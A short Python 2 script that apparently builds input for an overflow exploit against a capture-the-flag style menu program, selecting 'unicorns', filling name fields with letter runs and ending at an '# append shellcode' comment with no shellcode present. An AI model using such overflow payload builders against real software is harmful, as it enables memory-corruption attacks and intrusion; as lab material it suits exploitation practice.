import struct
import sys

# select all unicorns for overflow
output = ""
for i in range(0, 11):
    output += "u\n"

    
# fill names with B's
for i in range(0, 12):
    output += chr(0x41+i) * 10 + "\n"
# almost commit suicide
output += "a\n" * 16
output = output[0:len(output) - 1]

# append shellcode
print output
